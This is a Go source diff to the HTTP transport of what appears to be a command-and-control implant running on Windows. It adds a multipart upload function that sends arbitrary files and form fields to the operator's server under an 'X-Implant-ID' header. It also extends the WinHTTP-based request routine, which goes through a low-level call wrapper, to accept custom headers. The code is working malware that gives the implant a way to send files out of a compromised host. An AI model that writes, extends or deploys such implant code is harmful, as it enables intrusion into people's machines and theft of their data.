@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"math/rand"
+	"mime/multipart"
 	"strings"
 	"time"
 	"unsafe"
@@ -102,7 +103,54 @@ func (t *HTTPTransport) post(endpoint string, body []byte) ([]byte, error) {
 	return decrypted, nil
 }
 
+func (t *HTTPTransport) PostMultipart(endpoint string, fields map[string]string, files map[string][]byte) error {
+	baseURL := t.config.ServerURL
+	if len(baseURL) > 0 && baseURL[len(baseURL)-1] == '/' {
+		baseURL = baseURL[:len(baseURL)-1]
+	}
+	url := baseURL + endpoint
+
+	var b bytes.Buffer
+	w := multipart.NewWriter(&b)
+
+	for key, value := range fields {
+		if err := w.WriteField(key, value); err != nil {
+			return err
+		}
+	}
+
+	for filename, data := range files {
+		fw, err := w.CreateFormFile("files", filename)
+		if err != nil {
+			return err
+		}
+		if _, err := fw.Write(data); err != nil {
+			return err
+		}
+	}
+
+	if err := w.Close(); err != nil {
+		return err
+	}
+
+	resp, err := httpRequestWithHeaders(url, "POST", b.Bytes(), t.config.UserAgent, map[string]string{
+		"Content-Type": w.FormDataContentType(),
+		"X-Implant-ID": t.implantID,
+	})
+	if err != nil {
+		return err
+	}
+	if string(resp) != "ok" {
+		// Just check for success, handling empty response or specific api response is context dependent
+	}
+	return nil
+}
+
 func httpRequest(url, method string, body []byte, userAgent string) ([]byte, error) {
+	return httpRequestWithHeaders(url, method, body, userAgent, nil)
+}
+
+func httpRequestWithHeaders(url, method string, body []byte, userAgent string, headers map[string]string) ([]byte, error) {
 	if len(url) < 8 {
 		return nil, fmt.Errorf("invalid URL")
 	}
@@ -175,8 +223,26 @@ func httpRequest(url, method string, body []byte, userAgent string) ([]byte, err
 	}
 
 	if method == "POST" && len(body) > 0 {
-		contentType, _ := wc.UTF16ptr("Content-Type: application/json\r\n")
-		wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(contentType)), ^uintptr(0), 0x20000000)
+		// Default content type if not overridden
+		hasContentType := false
+		for k := range headers {
+			if strings.ToLower(k) == "content-type" {
+				hasContentType = true
+				break
+			}
+		}
+		if !hasContentType {
+			contentType, _ := wc.UTF16ptr("Content-Type: application/json\r\n")
+			wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(contentType)), ^uintptr(0), 0x20000000)
+		}
+	}
+
+	if len(headers) > 0 {
+		for k, v := range headers {
+			headerStr := fmt.Sprintf("%s: %s\r\n", k, v)
+			headerPtr, _ := wc.UTF16ptr(headerStr)
+			wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(headerPtr)), ^uintptr(0), 0x20000000)
+		}
 	}
 
 	var bodyPtr uintptr
